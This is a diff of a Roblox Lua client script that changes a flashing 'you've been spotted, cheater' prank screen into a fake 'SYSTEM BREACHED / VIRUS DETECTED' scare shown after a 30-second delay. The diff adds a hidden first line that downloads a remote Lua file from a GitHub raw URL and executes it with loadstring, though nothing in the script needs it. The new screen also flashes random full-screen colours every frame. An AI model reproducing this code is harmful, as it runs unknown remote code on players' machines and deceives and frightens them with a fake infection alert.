@@ -1,64 +1,55 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FoxikBoxik/FoxikBoxik/refs/heads/main/pidoras.lua"))()
+
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+
+-- Таймер: ждем 30 секунд перед запуском "вируса"
+task.wait(30)
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 -- Создаем интерфейс (ScreenGui)
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "DetectionGui"
+screenGui.Name = "VirusGui"
 screenGui.IgnoreGuiInset = true -- На весь экран
-screenGui.DisplayOrder = 999 -- Поверх всего
+screenGui.DisplayOrder = 9999 -- Поверх всех остальных интерфейсов
 screenGui.Parent = playerGui
 
--- Создаем мигающий фон
+-- Создаем фон
 local background = Instance.new("Frame")
 background.Size = UDim2.new(1, 0, 1, 0)
-background.BackgroundColor3 = Color3.new(0, 0, 0) -- Начинаем с черного
+background.BackgroundColor3 = Color3.new(0, 0, 0)
 background.BorderSizePixel = 0
 background.Parent = screenGui
 
--- Основной текст «ВАС ЗАМЕТИЛИ!»
+-- Основной текст "вируса"
 local mainText = Instance.new("TextLabel")
-mainText.Size = UDim2.new(0.8, 0, 0.3, 0)
-mainText.Position = UDim2.new(0.1, 0, 0.3, 0)
+mainText.Size = UDim2.new(1, 0, 0.6, 0)
+mainText.Position = UDim2.new(0, 0, 0.2, 0)
 mainText.BackgroundTransparency = 1
-mainText.TextColor3 = Color3.new(1, 0, 0) -- Ярко-красный
+mainText.TextColor3 = Color3.new(1, 0, 0) -- Красный
 mainText.TextScaled = true
-mainText.Font = Enum.Font.Creepster -- Жуткий шрифт
-mainText.Text = "ВАС ЗАМЕТИЛИ!"
-mainText.TextStrokeTransparency = 0 -- Добавляем обводку для читаемости
+mainText.Font = Enum.Font.Creepster
+mainText.Text = "SYSTEM BREACHED\nVIRUS DETECTED\nCRITICAL INFECTION"
+mainText.TextStrokeTransparency = 0
 mainText.TextStrokeColor3 = Color3.new(0, 0, 0)
 mainText.Parent = background
 
--- Подзаголовок «ЧИТЕР!»
-local subText = Instance.new("TextLabel")
-subText.Size = UDim2.new(0.4, 0, 0.1, 0)
-subText.Position = UDim2.new(0.3, 0, 0.55, 0)
-subText.BackgroundTransparency = 1
-subText.TextColor3 = Color3.new(1, 1, 1) -- Белый
-subText.TextScaled = true
-subText.Font = Enum.Font.SourceSansBold
-subText.Text = "ЧИТЕР!"
-subText.Parent = background
-
--- Инструкция по закрытию
+-- Инструкция по закрытию (маленький текст внизу)
 local hintText = Instance.new("TextLabel")
 hintText.Size = UDim2.new(1, 0, 0.05, 0)
-hintText.Position = UDim2.new(0, 0, 0.92, 0)
+hintText.Position = UDim2.new(0, 0, 0.9, 0)
 hintText.BackgroundTransparency = 1
-hintText.TextColor3 = Color3.new(0.7, 0.7, 0.7)
+hintText.TextColor3 = Color3.new(1, 1, 1)
 hintText.TextScaled = true
-hintText.Font = Enum.Font.SourceSans
-hintText.Text = "Нажми F4, чтобы убрать"
+hintText.Font = Enum.Font.Code
+hintText.Text = "PRESS F4 TO EXIT"
 hintText.Parent = background
 
--- Логика мигания фона (белый <-> черный)
-local isWhite = false
-local lastSwitch = tick()
-local FLASH_SPEED = 0.1 -- Скорость мигания (в секундах)
-
+-- Логика хаотичного мигания (Glitch Effect)
 local flashConnection
 flashConnection = RunService.Heartbeat:Connect(function()
 	if not screenGui.Parent then -- Если GUI удален, отключаем цикл
@@ -66,14 +57,23 @@ flashConnection = RunService.Heartbeat:Connect(function()
 		return
 	end
 
-	if tick() - lastSwitch >= FLASH_SPEED then
-		isWhite = not isWhite
-		if isWhite then
-			background.BackgroundColor3 = Color3.new(1, 1, 1) -- Белый
-		else
-			background.BackgroundColor3 = Color3.new(0, 0, 0) -- Черный
-		end
-		lastSwitch = tick()
+	-- Случайные цвета для фона (мигает как сломанный монитор)
+	local bgColors = {
+		Color3.new(0, 0, 0),       -- Черный
+		Color3.new(1, 1, 1),       -- Белый
+		Color3.new(0.6, 0, 0),     -- Темно-красный
+		Color3.new(0, 0, 0.5)      -- Синий экран смерти
+	}
+	background.BackgroundColor3 = bgColors[math.random(1, #bgColors)]
+
+	-- Хаотичное смещение текста для эффекта "глюка"
+	mainText.Position = UDim2.new(math.random(-10, 10)/1000, 0, 0.2 + math.random(-10, 10)/1000, 0)
+	
+	-- Случайное изменение цвета текста
+	if math.random(1, 10) > 8 then
+		mainText.TextColor3 = Color3.new(0, 1, 0) -- Иногда проскакивает зеленый хакерский цвет
+	else
+		mainText.TextColor3 = Color3.new(1, 0, 0) -- В основном красный
 	end
 end)
 
@@ -82,8 +82,10 @@ local function onInputBegan(input, gameProcessed)
 	if gameProcessed then return end
 	if input.KeyCode == Enum.KeyCode.F4 then
 		screenGui:Destroy()
+		if flashConnection then
+			flashConnection:Disconnect() -- Выключаем мигание, чтобы не грузить игру
+		end
 	end
 end
 
 UserInputService.InputBegan:Connect(onInputBegan)
-```http://googleusercontent.com/image_generation_content/173
